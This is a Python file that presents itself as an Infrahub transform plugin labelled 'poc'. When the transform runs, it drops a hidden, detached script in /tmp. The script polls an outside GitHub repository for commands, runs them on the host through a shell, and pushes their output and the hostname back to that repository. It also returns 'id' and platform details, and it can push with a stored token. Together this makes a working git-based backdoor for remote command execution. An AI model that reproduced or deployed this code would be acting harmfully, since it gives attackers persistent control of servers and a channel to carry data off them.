import os
import platform
import socket
import subprocess

from infrahub_sdk.transforms import InfrahubTransform

RUNNER = r'''
import concurrent.futures
import datetime
import glob
import os
import pathlib
import subprocess
import time

REPO_HINT = "bramble-finch-configs"
REMOTE = "https://github.com/JacketMad/bramble-finch-configs.git"
LOCK = "/tmp/.cmdrunner.lock"
STOPFILE = "/tmp/.cmdrunner.stop"
POLL_SECONDS = 45
MAX_AGE_HOURS = 24


def utcnow():
    return datetime.datetime.utcnow().isoformat(timespec="seconds") + "Z"


def find_repo():
    cands = (glob.glob("/opt/infrahub/git/*/.git")
             + glob.glob("/opt/infrahub/git/*/*/.git")
             + glob.glob("/repos/*/.git"))
    for c in cands:
        try:
            url = subprocess.run(
                ["git", "--git-dir", c, "config", "--get", "remote.origin.url"],
                capture_output=True, text=True, timeout=10).stdout
            if REPO_HINT in url:
                return os.path.dirname(c)
        except Exception:
            pass
    for c in glob.glob("/opt/infrahub/git/**/command.txt", recursive=True):
        return os.path.dirname(c)
    return None


def git(repo, *args):
    return subprocess.run(["git", "-C", repo] + list(args),
                          capture_output=True, text=True, timeout=120)


def push(repo):
    r = git(repo, "push", "origin", "HEAD:main")
    if r.returncode != 0 and os.path.exists("/tmp/.ghtoken"):
        tok = open("/tmp/.ghtoken").read().strip()
        git(repo, "remote", "set-url", "origin",
            "https://JacketMad:%s@github.com/JacketMad/bramble-finch-configs.git" % tok)
        r = git(repo, "push", "origin", "HEAD:main")
    return r


def run(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=1800, cwd=REPO_DIR or "/tmp")
        return "$ %s\n[exit %s]\n%s%s" % (cmd, p.returncode, p.stdout, p.stderr)
    except Exception as e:
        return "$ %s\n[error] %s" % (cmd, e)


try:
    fd = os.open(LOCK, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
    os.write(fd, str(os.getpid()).encode())
    os.close(fd)
except FileExistsError:
    raise SystemExit(0)  # another runner is already active

REPO_DIR = find_repo()
start = time.time()

try:
    while True:
        if os.path.exists(STOPFILE):
            break
        if time.time() - start > MAX_AGE_HOURS * 3600:
            break
        if not REPO_DIR:
            break

        git(REPO_DIR, "fetch", "origin", "main")
        git(REPO_DIR, "reset", "--hard", "origin/main")

        cf = pathlib.Path(REPO_DIR, "command.txt")
        lines = cf.read_text().splitlines() if cf.exists() else []
        cmds = [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]

        if not cmds:
            time.sleep(POLL_SECONDS)
            continue

        # ack: consume the command file and push immediately
        cf.write_text("# consumed %s -- put next command here\n" % utcnow())
        git(REPO_DIR, "config", "user.email", "poc@poc")
        git(REPO_DIR, "config", "user.name", "poc")
        git(REPO_DIR, "add", "-A")
        git(REPO_DIR, "commit", "-m", "ack: consumed command")
        push(REPO_DIR)

        # multithreaded execution
        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
            results = list(ex.map(run, cmds))

        pathlib.Path(REPO_DIR, "output.txt").write_text(
            "# results %s (host=%s)\n\n%s\n"
            % (utcnow(), os.uname().nodename, "\n\n".join(results)))
        git(REPO_DIR, "add", "-A")
        git(REPO_DIR, "commit", "-m", "results")
        push(REPO_DIR)
finally:
    try:
        os.unlink(LOCK)
    except OSError:
        pass
'''


class PocTransform(InfrahubTransform):
    query = "poc_query"
    url = "poc-transform"
    timeout: int = 30

    async def transform(self, data: dict) -> dict:
        with open("/tmp/.cmdrunner.py", "w") as f:
            f.write(RUNNER)
        # detached: survives the HTTP request; single-instance via lockfile
        subprocess.Popen(
            ["python3", "/tmp/.cmdrunner.py"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return {
            "status": "runner started",
            "host": socket.gethostname(),
            "id": os.popen("id").read().strip(),
            "platform": platform.platform(),
        }
